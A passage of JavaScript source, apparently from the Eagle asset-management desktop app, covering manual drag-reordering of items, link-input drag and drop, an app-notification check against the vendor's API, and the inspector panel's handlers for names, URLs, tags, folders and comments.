                    // diff = Math.abs(middle.minus(targetOrder).toNumber()) / selected.length;
                    diff = middle.minus(targetOrder).div(selected.length).toPrecision();
                }
            }
            else {
                if (!$scope.allData[idx + 1]) {
                    prev = $scope.allData[idx];
                    if (prev) {
                        prevOrder = _.get(prev, `order[${currentFolderId}]`, prev.modificationTime) || prev.modificationTime;
                        if (sortIncrease) {
                            // targetOrder = prevOrder - 1;
                            targetOrder = new BigNumber(prevOrder).minus(1);
                        }
                        else {
                            // targetOrder = prevOrder + 1;
                            targetOrder = new BigNumber(prevOrder).plus(1);
                        }
                        // middle = (prevOrder + targetOrder) / 2;
                        middle = targetOrder.plus(prevOrder).div(2);
                        // diff = Math.abs(middle - targetOrder) / selected.length;
                        diff = middle.minus(targetOrder).div(selected.length).toPrecision();
                        idx++;
                    }
                }
                else {
                    prev = $scope.allData[idx];
                    target = $scope.allData[idx + 1];
                    if (prev && target) {
                        prevOrder = _.get(prev, `order[${currentFolderId}]`, prev.modificationTime) || prev.modificationTime;
                        targetOrder = _.get(target, `order[${currentFolderId}]`, target.modificationTime) || target.modificationTime;
                        // middle = (prevOrder + targetOrder) / 2;
                        middle = new BigNumber(prevOrder).plus(targetOrder).div(2);
                        // diff = Math.abs(middle - targetOrder) / selected.length;
                        diff = middle.minus(targetOrder).div(selected.length).toPrecision();
                        idx++;
                    }
                }
            }
        }

        if ((middle && !middle.toPrecision()) || diff == 0) return;

        // selected.forEach(function (item, index) {
        selected.reverse().forEach(function (item, index) {
            $scope.allData.splice(idx, 0, item);
            if (!item.order) { item.order = {} };
            if (sortIncrease) {
                item.order[currentFolderId] = middle.plus(new BigNumber(diff).multipliedBy(index)).toPrecision();
                // item.order[currentFolderId] = middle + diff * index;
            }
            else {
                item.order[currentFolderId] = middle.plus(new BigNumber(diff).multipliedBy(index)).toPrecision();
                // item.order[currentFolderId] = middle - diff * index;
            }
            console.log(item.order[currentFolderId]);
        });

        // 更新画面
        if ($elements.length > 0 && $target.length > 0) {
            ig.moveElementsBefore($elements, $target[0], isAppend);
            setTimeout(function () {
                $bodyScope.showImages();
            }, 50);
        }
        
        $scope.offsetScrollbar(30);
        ayncsImagesChange(selected);
        hiddenByCurrentFilter(selected);

        electronLog && electronLog.info(`[app] Sort ${selected.length} items to index: ${idx}, folder: ${$scope.currentFolder.name}(${$scope.currentFolder.id})`);

        // 更新文件夹排列模式
        if ($scope.currentFolder && $scope.currentFolder.orderBy !== "MANUAL") {
            $scope.setFolderOrder($scope.currentFolder, "MANUAL", true);
            $scope.setFolderSortIncrease($scope.currentFolder, true, true);
        }

    }
}

function onDragEnterLinkInput (event) {
    if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0]) {
        var path = event.dataTransfer.files[0].path;
        event.preventDefault();
        event.stopPropagation();
        event.dataTransfer.dropEffect = "copy"
        if (IS_DIRECTORY.check(path)) {
            dragging = false;
        }
    }
    if (dragging) return;
    console.log("onDragEnterLinkInput");
    $(".inspector .link-input input").addClass("drag-over");
    return false
};

function onDragLeaveLinkInput (event) {
    event.preventDefault();
    event.stopPropagation();
    event.dataTransfer.dropEffect = "copy"
    console.log("onDragLeaveLinkInput");
    $(".inspector .link-input input").removeClass("drag-over");
    return false;
};


function onDropLinkInput(event) {

    if (dragging) {
        dragging = false;
        return;
    }

    event && event.preventDefault();
    event && event.stopPropagation();

    var $scope = angular.element("body").scope();
    var dragUrl = event.dataTransfer && jQuery("<div></div>").html(event.dataTransfer.getData("text/html")).find("img").attr("src");
    var files = event.dataTransfer && event.dataTransfer.files;

    if (!dragUrl) {
        if (is.url(event.dataTransfer.getData("text/plain"))) {
            dragUrl = event.dataTransfer.getData("text/plain");
        }
    }
    
    $(".inspector .link-input input").removeClass("drag-over");

    if (dragUrl) {
        $scope.inspector.newUrl = dragUrl;
        $scope.imagesChange();
        $scope.$evalAsync();
    }
    else if (!dragging && files.length == 1) {
        var file = files[0];
        if (file.path) {
            $scope.inspector.newUrl = file.path;
            $scope.imagesChange();
            $scope.$evalAsync();
        }
    }
}
EagleApp.directive('notificationBtn', function($timeout, $rootScope) {
    return {
        restrict: 'A',
        link: function ($scope, element, attrs, controllersArr) {

            function init() {
                let lastOpenAppNotificationDate = localStorage["lastOpenAppNotificationDate"];
                if (!lastOpenAppNotificationDate) {
                    localStorage["lastOpenAppNotificationDate"] = 0;
                    lastOpenAppNotificationDate = localStorage["lastOpenAppNotificationDate"];
                }
                fetch(`https://eagle.cool/api/get-app-notifications?date=${lastOpenAppNotificationDate}&version=${encodeURIComponent(appVersion)}&buildVersion=${encodeURIComponent(buildVersion)}`, { referrer: '', mode: 'cors', method: 'GET', }).then(function(response) {
                    return response.json();
                }).then(function(result) {
                    console.log(result);
                    if (result && result.unread > 0) {
                        $scope.unreadNotification = result.unread;
                        if (result.autoShow) {
                            $scope.openNofication();
                        }
                    } else {
                        $scope.unreadNotification = 0;
                    }
                });
            }

            $scope.openNofication = function() {
                localStorage["lastOpenAppNotificationDate"] = Date.now();
                $rootScope.$broadcast("OPEN_NOTIFICATION");
                $scope.unreadNotification = 0;
                $scope.$evalAsync();
            };

            init();
        }
    }
});
EagleApp.directive('inspector', ($timeout, $rootScope, $filter) => ({
    restrict: 'E',
    templateUrl: 'js/directives/inspector.html',
    scope: {
        platform: '=platform',
        theme: '=theme',
        isAlwaysOnTop: '=isAlwaysOnTop',
        viewMode: '=viewMode',
        current: '=current',
        selected: '=selected',
        currentFolder: '=currentFolder',
        currentSmartFolder: '=currentSmartFolder',
        folderMappings: '=folderMappings',
        selectedFolderMappings: '=selectedFolderMappings',
        TagManager: '=tagManager',
        trialRemain: '=trialRemain',
    },
    link: function ($scope, element, attrs, controllersArr) {

        ipcRenderer.on('plugin-installed', (event, pluginId) => {
            eagle.inspector.initPlugins();
            $scope.$evalAsync();
        });

        ipcRenderer.on('plugin-reloaded', (event, pluginId) => {
            eagle.inspector.initPlugins();
            $scope.$evalAsync();
        });

        $scope.VIDEO_TYPES = VIDEO_TYPES;
        $scope.AUDIO_TYPES = AUDIO_TYPES;
		$scope.MODEL_TYPES = MODEL_TYPES;
        $scope.FONT_TYPES = FONT_TYPES;
        $scope.URL_TYPES = URL_TYPES;
        $scope.inspector = eagle.inspector;
        $scope.inspectorPreviewStartIndex = 0;
        $scope.selectedIndexMappings = {};

        $(".inspector").on("mouseup", ".image", (event) => {
            const button = event?.button;
            if (button === 1) {
                $bodyScope.openPluginPanel();
                $bodyScope.$evalAsync();
            }
            else if (button !== 0) {
                $bodyScope.openItemContextMenu(event, $scope.selected[0]);
                $bodyScope.$evalAsync();
            }
        });

        $scope.$watchCollection("selected", (newValue, oldValue) => {
            if (!$scope.selected) return;

            $scope.selectedIndexMappings = {};
            $scope.inspectorPreviewStartIndex = $scope.selected.length - 5;

            if ($scope.inspectorPreviewStartIndex < 0) $scope.inspectorPreviewStartIndex = 0

            if ($scope.selected.length > 0) {
                eagle.inspector.activeTab = "ITEM";
                $scope.selected.forEach((image, index) => {
                    $scope.selectedIndexMappings[image.id] = index;
                });
            }
            else {
                eagle.inspector.activeTab = "SIDEBAR";
            }
        });

        var onInspectorResizeTimeout;
        $scope.onInspectorResize = function (e, ui) {
            if (ui && ui.size.width >= 200) {
                clearTimeout(onInspectorResizeTimeout);
                eagle.inspector.width = ui.size.width;
                onInspectorResizeTimeout = setTimeout(() => {
                    $bodyScope.relayout();
                    $bodyScope.offsetScrollbar(30);
                }, 500);
            }
        };

        $scope.hidePluginMap = JSON.parse(localStorage["eagle.inspector.hidePluginMap"] || "{}");
        $scope.togglePlugin = (plugin) => {
            if (!plugin) return;
            if (!$scope.hidePluginMap[plugin?.manifest?.id]) {
                $scope.hidePluginMap[plugin?.manifest?.id] = true;
            }
            else {
                delete $scope.hidePluginMap[plugin?.manifest?.id];
            }
            localStorage["eagle.inspector.hidePluginMap"] = JSON.stringify($scope.hidePluginMap);
        };

        $scope.hasInspectorPlugin = (plugin, items) => {
            let foundPlugins = [];
            if (items.length === 1) {
                const item = items[0];
                foundPlugins = pluginModule.previewExtension.inspectorPluginsMap[item.ext] ?? [];
            }
            else if (items.length > 1) {
                foundPlugins = pluginModule.previewExtension.getMultiSelectInspectorPlugin(items[0].ext) ?? [];
            }

            foundPlugins = foundPlugins.filter((plugin) => {
                return pluginModule.installedPluginMaps[plugin?.manifest?.id];
            });

            if (foundPlugins.length === 0) return false;

            return foundPlugins?.map(plugin => plugin?.manifest?.id).includes(plugin?.manifest?.id);
        };
        
        $scope.quickOpenFolder = (folder) => {
            $bodyScope.quickOpenFolder(folder);
        };

        $scope.autoScroll = () => {
            $bodyScope.autoScroll();
        };

        $scope.openLink = () => {
            $bodyScope.openLink();
        };

        $scope.changeStar = function (star, showNotify, force) {
            $bodyScope.changeStar(star, showNotify, force);
        };

        $scope.openImageExportContextMenu = (event) => {
            $bodyScope.openImageExportContextMenu(event);
        };

        $scope.openFolderFullPathContextMenu = (event, folder) => {
            $bodyScope.openFolderFullPathContextMenu(event, folder);
        };

        $scope.getFolderFullPath = (folder) => {
            return $bodyScope.getFolderFullPath(folder);
        };

        $scope.removeFromFolder = (event, folderId) => {
            $bodyScope.removeFromFolder(event, folderId);
        };

        $scope.preventEnter = (event) => {
            if (event.keyCode === 13) {
                event.preventDefault();
                $(event.target).trigger("blur");
            }
            else if (event.keyCode === 27) {
                event.preventDefault();
                event.stopPropagation();
            }
        };

        $scope.selectLinkInput = ($event) => {
            if ($event && $event.target) {
                $($event.target).select();
            }
        };

        $scope.newNameOrUrlKeyup = (event) => {
            if (event.keyCode === 13) {
                $scope.imagesChange();
            }
        };

        $scope.newUrlKeyup = (event) => {
            if (event.keyCode === 13) {
                $scope.urlChange();
            }
        };

        $scope.$on("INSPECTOR_SAVE_CHANGES", () => {
            $scope.imagesChange();
        });

        $scope.$on("PLUGIN_UNINSTALL", () => {
            eagle.inspector.initPlugins();
        });

        $scope.imagesChange = () => {
            var name = eagle.inspector.newName;
            console.log(`before: ${name.length}`)
            name = name.substr(0, remainingFilenameLength($bodyScope.libraryPath));
            console.log(`after: ${name.length}`)
            name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
            name = _.unescape(name);

            // 禁止清除名稱，一定要有文字
            if (name === "" && $scope.selected.length === 1) {
                $scope.updateSelection();
                return;
            }

            eagle.inspector.newName = name;

            if (emojiRegex.test(name)) {
                name = name.replace(emojiRegex, '');
                eagle.inspector.newName = name;
            }

            let changedItems = [];

            $scope.selected.forEach(function(image) {

                let hasChanged = false;

                if (typeof eagle.inspector.newUrl === "string" && image.url !== eagle.inspector.newUrl) {
                    if (is.url(eagle.inspector.newUrl) || eagle.inspector.newUrl == "" || eagle.inspector.newUrl.indexOf("file://") === 0) {
                        image.url = eagle.inspector.newUrl;
                        hasChanged = true;
                    }
                    else if (fs.existsSync(eagle.inspector.newUrl)) {
                        image.url = eagle.inspector.newUrl;
                        hasChanged = true;
                    }
                    else if (eagle.inspector.newUrl.indexOf("://") > -1) {
                        image.url = eagle.inspector.newUrl;
                        hasChanged = true;
                    }
                }

                let cloneImage = angular.copy(image);

                if (name) {
                    if (cloneImage.name !== name) {
                        cloneImage.oldName = cloneImage.name;
                        cloneImage.name = name;
                        cloneImage.newName = name;
                        hasChanged = true;
                    }
                }

                if (hasChanged) {
                    changedItems.push(cloneImage);
                    $bodyScope.updateItemView(cloneImage);

                    if (!$bodyScope.modifiedMappings[image.id]) {
                        $bodyScope.modifiedMappings[image.id] = 1;
                    }
                    else {
                        $bodyScope.modifiedMappings[image.id]++;
                    }
                }
            });

            if (changedItems.length > 0) {
                ayncsImagesChange(changedItems);
                hiddenByCurrentFilter(changedItems);

                electronLog.info(`[app] Change items info from inspctor, total: ${$scope.selected.length} files`);

                // 避免修改影片名稱造成影片重頭播放
                if ($bodyScope.isDetailMode) {
                    $bodyScope.rememberVideoCurrentTime($scope.current);
                    if ($("#font-viewer").length > 0) {
                        $("iframe#font-viewer").contents().find(".font-name span").text(eagle.inspector.newName);
                    }
                }
                $bodyScope.rebindRefresh(true);
            }
        };

        // 檢查器名稱欄位修改
        var inspectorCategoryNameChangeTimeout;
        $scope.inspectorCategoryNameChange = () => {
            var name = eagle.inspector.category.newName;
            var target;
            if (eagle.inspector.inspectorFolder) {
                target = eagle.inspector.inspectorFolder;
            }
            else {
                target = $scope.currentSmartFolder;
            }
            if (name === "") {
                eagle.inspector.category.newName = target.name;
                return;
            }
            $timeout.cancel(inspectorCategoryNameChangeTimeout);
            inspectorCategoryNameChangeTimeout = $timeout(() => {
                if (target) {
                    const originalName = target.name;
                    name = name.substr(0, 1024);
                    name = name.replaceAll("&amp;", "&");
                    target.name = name;
                    if (_.isString(target.name)) {
                        target.pinyin = tinyPinyin.convertToPinyin(target.name);
                    }
                    try { electronLog && electronLog.info(`[app] Change inspctor folder name: ${originalName}(${target.id}) > ${target.name}`); } catch (err) { };
                }
                $bodyScope.saveFolder();
            }, 1000);
        };

        var inspectorCategoryDescriptionChangeTimeout;
        $scope.inspectorCategoryDescriptionChange = function () {
            const description = eagle.inspector.category.newDescription;
            let target;
            if (eagle.inspector.inspectorFolder) {
                target = eagle.inspector.inspectorFolder;
            }
            else {
                target = $scope.currentSmartFolder;
            }
            if (target) {
                target.description = description;
            }
            $timeout.cancel(inspectorCategoryDescriptionChangeTimeout);
            inspectorCategoryDescriptionChangeTimeout = $timeout(() => {
                $bodyScope.saveFolder();
            }, 1000);
        };

        $scope.annotationChange = function() {
            let annotation = eagle.inspector.newAnnotation;
            annotation = annotation.substr(0, 20480);
            annotation = _.unescape(annotation);

            const items = [...$scope.selected];

            $bodyScope.checkOperationSafety(() => {
                items.forEach((image) => {
                    image.annotation = annotation;
                });
                ayncsImagesChange(items);
                hiddenByCurrentFilter(items);
                $bodyScope.rebindRefresh(true);
                electronLog.info(`[app] Change file comemnt, total: ${items.length} files`);
            });
        };

        $scope.urlChange = () => {
            $bodyScope.checkOperationSafety(() => {
            
                let changedItems = [];

                $scope.selected.forEach(function(image) {

                    let hasChanged = false;

                    if (typeof eagle.inspector.newUrl === "string" && image.url !== eagle.inspector.newUrl) {
                        if (is.url(eagle.inspector.newUrl) || eagle.inspector.newUrl == "" || eagle.inspector.newUrl.indexOf("file://") === 0) {
                            image.url = eagle.inspector.newUrl;
                            hasChanged = true;
                        }
                        else if (fs.existsSync(eagle.inspector.newUrl)) {
                            image.url = eagle.inspector.newUrl;
                            hasChanged = true;
                        }
                        else if (eagle.inspector.newUrl.indexOf("://") > -1) {
                            image.url = eagle.inspector.newUrl;
                            hasChanged = true;
                        }
                    }

                    let cloneImage = angular.copy(image);
                    if (hasChanged) {
                        changedItems.push(cloneImage);
                        $bodyScope.updateItemView(cloneImage);

                        if (!$bodyScope.modifiedMappings[image.id]) {
                            $bodyScope.modifiedMappings[image.id] = 1;
                        }
                        else {
                            $bodyScope.modifiedMappings[image.id]++;
                        }
                    }
                });

                if (changedItems.length > 0) {
                    ayncsImagesChange(changedItems);
                    hiddenByCurrentFilter(changedItems);

                    electronLog.info(`[app] Change items info from inspctor, total: ${$scope.selected.length} files`);

                    // 避免修改影片名稱造成影片重頭播放
                    if ($bodyScope.isDetailMode) {
                        $bodyScope.rememberVideoCurrentTime($scope.current);
                        if ($("#font-viewer").length > 0) {
                            $("iframe#font-viewer").contents().find(".font-name span").text(eagle.inspector.newName);
                        }
                    }
                    $bodyScope.rebindRefresh(true);
                }
            });
        };


        $scope.$on("UPDATE_INSPECTOR", () => {
            $scope.updateSelection();
        });

        var updateSelectionTimeout;
        $scope.updateSelection = function() {

            $timeout.cancel(updateSelectionTimeout);
            updateSelectionTimeout = $timeout(function() {

                var selected = $scope.selected;
                if (selected.length > 1) {
                    $scope.inspector.newNamePlaceholder = i18n.__("inspector.names.multipleTitles");
                    $scope.inspector.newUrlPlaceholder = i18n.__("inspector.names.multipleUrls");
                    $scope.inspector.newName = eagle.inspector.calculateName(selected);
                    $scope.inspector.newUrl = eagle.inspector.calculateUrl(selected);
                    $scope.inspector.newTags = eagle.inspector.calculateTags(selected);
                    $scope.inspector.newAnnotation = eagle.inspector.calculateAnnotation(selected);
                    $scope.inspector.folders = eagle.inspector.calculateFolders(selected);
                    $scope.inspector.star = eagle.inspector.calculateStar(selected);
                    $scope.inspector.size = eagle.inspector.calculateFileSize(selected);
                    $scope.inspector.activeTab = "ITEM";
                } else if (selected.length == 1) {
                    if (selected[0]) {
                        $scope.inspector.newNamePlaceholder = $filter('i18n')("title");
                        $scope.inspector.newUrlPlaceholder = "http://";
                        $scope.inspector.newName = selected[0].name || "";
                        $scope.inspector.newUrl = selected[0].url || "";
                        $scope.inspector.newTags = selected[0].tags;
                        $scope.inspector.newAnnotation = selected[0].annotation || "";
                        $scope.inspector.folders = [];
                        $scope.inspector.star = selected[0].star || 0;
                        $scope.inspector.activeTab = "ITEM";
                    }
                }
                else {
                    $scope.inspector.activeTab = "SIDEBAR";
                    switch ($scope.viewMode) {
                        case "all":
                            $scope.inspector.category = {
                                newName: i18n.__('inspector.names.all'),
                                newDescription: "",
                                createDate: undefined,
                                imageCount: $bodyScope.all.length,
                                fileSize: eagle.inspector.calculateFileSize($bodyScope.all),
                                exportable: false,
                                editable: false
                            };
                            break;
                        case "unfiled":
                            $scope.inspector.category = {
                                newName: i18n.__('inspector.names.unfiled'),
                                newDescription: "",
                                createDate: undefined,
                                imageCount: $bodyScope.unfiledCount,
                                fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                exportable: false,
                                editable: false
                            };
                            break;
                        case "untagged":
                            $scope.inspector.category = {
                                newName: i18n.__('inspector.names.untagged'),
                                newDescription: "",
                                createDate: undefined,
                                imageCount: $bodyScope.untaggedCount,
                                fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                exportable: false,
                                editable: false
                            };
                            break;
                        case "trash":
                            $scope.inspector.category = {
                                newName: i18n.__('inspector.names.trash'),
                                newDescription: "",
                                createDate: undefined,
                                imageCount: $bodyScope.allData.length,
                                fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                exportable: false,
                                editable: false
                            };
                            break;
                        case "duplicate":
                            $scope.inspector.category = {
                                newName: $filter('i18n')('inspector.names.duplicate'),
                                newDescription: "",
                                createDate: undefined,
                                imageCount: $bodyScope.allData.length,
                                fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                exportable: false,
                                editable: false
                            };
                            break;
                        default:
                            if ($rootScope.selectedFolders.length > 0) {
                                $scope.inspector.category = {
                                    newName: i18n.__('inspector.names.multipleTitles'),
                                    newDescription: "",
                                    createDate: undefined,
                                    imageCount: $bodyScope.allData.length,
                                    fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                    exportable: false,
                                    editable: false
                                };
                            }
                            else if ($scope.selectedFolderMappings && Object.keys($scope.selectedFolderMappings).length >= 1) {
                                var selectedFolders = Object.keys($scope.selectedFolderMappings).map(function(key) {
                                    return key;
                                });
                                if (selectedFolders[0] && $scope.folderMappings[selectedFolders[0]]) {
                                    eagle.inspector.inspectorFolder = $scope.folderMappings[selectedFolders[0]];
                                    $scope.inspector.category = {
                                        newName: eagle.inspector.inspectorFolder.name,
                                        newDescription: eagle.inspector.inspectorFolder.description || "",
                                        createDate: eagle.inspector.inspectorFolder.modificationTime,
                                        imageCount: eagle.inspector.inspectorFolder.imageCount,
                                        fileSize: undefined,
                                        exportable: !(eagle.inspector.inspectorFolder.password && !eagle.inspector.inspectorFolder.isUnLock),
                                        editable: !(eagle.inspector.inspectorFolder.password && !eagle.inspector.inspectorFolder.isUnLock)
                                    };
                                }
                            }
                            else if ($scope.currentFolder) {
                                eagle.inspector.inspectorFolder = $scope.currentFolder;
                                $scope.inspector.category = {
                                    newName: eagle.inspector.inspectorFolder.name,
                                    newDescription: eagle.inspector.inspectorFolder.description || "",
                                    createDate: eagle.inspector.inspectorFolder.modificationTime,
                                    imageCount: $bodyScope.allData.length,
                                    fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                    exportable: true,
                                    editable: true
                                };
                            }
                            else if ($scope.currentSmartFolder) {
                                $scope.inspector.category = {
                                    newName: $scope.currentSmartFolder.name,
                                    newDescription: $scope.currentSmartFolder.description || "",
                                    createDate: $scope.currentSmartFolder.modificationTime,
                                    imageCount: $bodyScope.allData.length,
                                    fileSize: eagle.inspector.calculateFileSize($bodyScope.allData),
                                    exportable: true,
                                    editable: true
                                };
                            }
                    }
                }

                // 排序標籤，優先使用群組順序排，皆者使用字母順序排
                if ($scope.inspector.newTags.length > 0) {
                    $scope.inspector.newTags = sortTags($scope.inspector.newTags);
                }
            }, 30);
        };

        function sortTags(original) {
            try {
                if (!original || original.length === 0) return;
                let tags = [...original];

                const tagGroupsIndexMap = {};
                $scope.TagManager.groups.forEach((tagGroup, index) => {
                    tagGroupsIndexMap[tagGroup.id] = index;
                });

                tagGroupsIndexMap['none'] = $scope.TagManager.groups.length;

                tags = tags.sort((tagA, tagB) => {
                    const a = $scope.TagManager.tagMappings[tagA];
                    const b = $scope.TagManager.tagMappings[tagB];
                    const aName = a.name;
                    const bName = b.name;
                    const aGroup = a?.groups[0] || 'none';
                    const bGroup = b?.groups[0] || 'none';
                    
                    // sort by groups index, if same group, sort by name
                    if (tagGroupsIndexMap[aGroup] < tagGroupsIndexMap[bGroup]) return -1;
                    if (tagGroupsIndexMap[aGroup] > tagGroupsIndexMap[bGroup]) return 1;
                    if (aName < bName) return -1;
                    if (aName > bName) return 1;
                    return 0;
                });

                return tags;
            } catch (err) {
                console.error(err);
                return original;
            }
        }

        $scope.setFolderPassword = function (folder) {
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'new'
            });
        };

        $scope.changeFolderPassword = function (folder) {
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'change'
            });
        };

        $scope.resetFolderPassword = function (folder) {
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'reset'
            });
        };

        $scope.openInspectorTagSelectPanel = () => {
            $bodyScope.openInspectorTagSelectPanel();
        };

        $scope.openInspectorFolderSelectPanel = () => {
            $bodyScope.openInspectorFolderSelectPanel();
        };

        $scope.openFolderExportContextMenu = (event, folder) => {
            $bodyScope.openFolderExportContextMenu(event, folder);
        };

        $scope.openSmartFolderExportContextMenu = (event, smartFolder) => {
            $bodyScope.openSmartFolderExportContextMenu(event, smartFolder);
        };

        $scope.openColorContextMenu = (palette) => {
            $bodyScope.openColorContextMenu(palette);
        };

        $scope.filterWithColor = (color, ignoreHistory) => {
            $bodyScope.filterWithColor(color, ignoreHistory);
        };

        $scope.openTrialModal = (trialRemain) => {
            $bodyScope.openTrialModal(trialRemain);
        };

        $scope.rgbToHex = function(r, g, b) {
            if (r === undefined) {
                return false;
            }
            return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase();
        }

        $scope.getLastestThumbnailPath = function (image) {
        	return FileUrlHelper.getLastestThumbnailUrl(image);
        };

        $scope.getThumbnailUrl = function (image) {
            return FileUrlHelper.getThumbnailUrl(image);
        };

        $scope.getExifPath = function (image) {
            if (image) {
                return `./exif-viewer/index.html?orientation=${image.orientation}&path=${encodeURIComponent(FileUrlHelper.getLastestThumbnailUrl(image))}&width=${image.width}&height=${image.height}`;
            }
        };

        $scope.tagsInputMouseDown = (event, tag) => {
            if (event.button === 2) {
                event.stopPropagation();
                event.preventDefault();
                let items = [];
                if (tag) {
                    items = [
                        // 篩選
                        {
                            label: i18n.__("Context.Tag.FilterWithTags"),
                            icon: 'ic-tag-filter.svg',
                            click: () => {
                                $scope.TagManager.filterWithTags([tag]);
                                $scope.$evalAsync();
                            }
                        },
                        {
                            role: 'separator'
                        },
                        // 重命名
                        {
                            label: i18n.__("Context.Tag.Edit.Title"),
                            icon: 'ic-rename.svg',
                            click: () => {
                                $bodyScope.editTag($scope.TagManager.tagMappings[tag]);
                                $bodyScope.$evalAsync();
                            }
                        },
                        // 複製
                        {
                            disabled: !(eagle.inspector?.newTags?.length > 0),
                            label: i18n.__('context.tagInput.copyTag'),
                            icon: 'ic-tag-copy.svg',
                            click: () => { 
                                eagle.inspector.copyTags([tag]);
                                $bodyScope.notify({
                                    message: i18n.__("Context.Tag.Copy.Success"),
                                    duration: 750
                                });
                                $bodyScope.$evalAsync();
                            }
                        },
                        // 貼上
                        {
                            disabled: !eagle.inspector.copiedTags,
                            label: i18n.__('context.tagInput.pasteTag'),
                            icon: 'ic-tag-paste.svg',
                            click: () => { $bodyScope.pasteTags(); }
                        }
                    ];
                }
                else {
                    items = [
                        // 複製貼上清除
                        {
                            disabled: !(eagle?.inspector?.newTags?.length > 0),
                            label: i18n.__('context.tagInput.copyTag'),
                            icon: 'ic-tag-copy.svg',
                            accelerator: 'CmdOrCtrl+Shift+C',
                            click: () => { $bodyScope.copyTags(); }
                        },
                        {
                            disabled: !eagle.inspector.copiedTags,
                            label: i18n.__('context.tagInput.pasteTag'),
                            icon: 'ic-tag-paste.svg',
                            accelerator: 'CmdOrCtrl+Shift+V',
                            click: () => { $bodyScope.pasteTags(); }
                        },
                        { role: 'separator' },
                        {
                            label: i18n.__("context.tagInput.clearTag"),
                            icon: 'ic-tag-empty.svg',
                            click: () => { 
                                $scope.clearAllTags();
                                $bodyScope.$evalAsync();
                            }
                        }
                    ];
                }
                ContextMenu.open({
                    items: items,
                    showSearch: false,
                });
            }
        };

        $scope.clearAllTags = _.throttle(function() {
            if ($scope.selected && $scope.selected.length > 0) {

                var origin = [];
                var originTags = [];
                var changedItems = [];

                $scope.selected.forEach((image) => {
                    if (image.tags && image.tags.length !== 0) {
                        changedItems.push(image);
                        origin.push(image);
                        originTags.push(angular.copy(image.tags));
                        image.tags = [];
                    }
                });
                $scope.updateSelection();
                ayncsImagesChange(changedItems);
                hiddenByCurrentFilter(changedItems);

                $bodyScope.notify({
                    message: $filter('i18n')("Context.Tag.ClearAll.Success"),
                    duration: 4000
                }, () => {
                    origin.forEach((image, index) => {
                        image.tags = originTags[index];
                    });
                    $bodyScope.calculateImageBinding({ ignoreSort: true }, () => {
                        $bodyScope.rebindRefresh();
                        $scope.updateSelection();
                    });
                    ayncsImagesChange(origin);
                });

                electronLog.info(`[app] Right-clibk to empty inspctor's tags, total: ${$scope.selected.length} files`);
            }
        }, 500);

        $scope.imageCommentsSortableOptions = {
            distance: 5,
            tolerance: "pointer",
            disabled: false,
			helper : 'clone',
            update: function(e, ui) {
                if ($scope.selected[0]) {
                    ayncsImagesChange([$scope.selected[0]]);
                    try { electronLog && electronLog.info(`[app] Sort item's annotations: ${$scope.selected[0].id}`); } catch (err) {};
                }
            },
        };

        $scope.copyComment = function(event, image, comment) {
            if (comment && comment.annotation) {
                clipboard.writeText(_.unescape(comment.annotation));
                $bodyScope.notify({
                    message: i18n.__("previewWindow.copied"),
                    duration: 750
                });
            }
        };

        $scope.openComment = function(event, image, comment) {
            if (!$bodyScope.isDetailMode) {
                $bodyScope.enterDetailMode(event, image);
                $timeout(function () {
                    $bodyScope.openComment(event, image, comment);
                }, 500);
                return;
            }

            // 自动滚动到 annotation 处
            // 如果超過才滾動
            if (comment && comment.y) {
                let $commentElem = $(`#comment-${comment.id}`);
                if ($commentElem.length > 0 && !isElementInViewport($commentElem[0])) {
                    var offsetY = -200;
                    $("#detail-container").smoothZoom('goToY', -(comment.y + offsetY) * $bodyScope.imageSize.zoomRatio / 100);
                    setTimeout(function () {
                        AnnotationPreview.show();
                    }, 100);
                }
            }
        };

        $scope.highlightAnnotation = function(event, comment) {
            if ($bodyScope.isDetailMode && comment) {
                var $comment = $(`#comment-${comment.id}`);
                $comment.addClass("highlight");
                AnnotationPreview.lastElem = $comment[0];
			    AnnotationPreview.hoverTimeout = setTimeout(function () {
			    	AnnotationPreview.show();
			    }, 200);
            }
        };

        $scope.removeHighlightAnnotation = function(event, comment) {
            if ($bodyScope.isDetailMode && comment) {
                var $comment = $(`#comment-${comment.id}`);
                $comment.removeClass("highlight");
                clearTimeout(AnnotationPreview.hoverTimeout);
			    if (AnnotationPreview.lastElem) {
			        AnnotationPreview.hide();
			    }
            }
        };

        $scope.editVideoComment = (event, image, comment) => {
            // event.stopPropagation();

            if (!$bodyScope.isDetailMode) {
                $bodyScope.enterDetailMode(event, image);
                $timeout(function () {
                    $scope.editVideoComment(event, image, comment);
                }, 500);
                return;
            }

            var video = $(".detail-wrap video")[0];
            if (video) {
                video.currentTime = comment.duration;
                video.pause();
            }

            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon create"></div>
                        <h4 class="alert-title">${i18n.__('dialog.videoComment.title')}</h4>
                    </div>
                `,
                input: 'textarea',
                inputPlaceholder: i18n.__("dialog.videoComment.placeholder"),
                inputValue: comment.annotation,
                allowEnterKey: false,
                showCloseButton: false,
                showCancelButton: true,
                allowOutsideClick: false,
                focusConfirm: false,
                focusCancel: false,
                padding: 10,
                position: 'bottom',
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.videoComment.save"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then((result) => {
                if (!result) return;
                comment.annotation = result;
                ipcRenderer.send('image-change', image);
                $rootScope.$broadcast("REFRESH_VIDEO_COMMENTS");
                $bodyScope.updateItemView(video);
                $bodyScope.$evalAsync();
            });
        };

        $scope.openVideoComment = (event, image, comment) => {
            if (!$bodyScope.isDetailMode) {
                $bodyScope.enterDetailMode(event, image);
                $timeout(function () {
                    $scope.openVideoComment(event, image, comment);
                }, 500);
                return;
            }
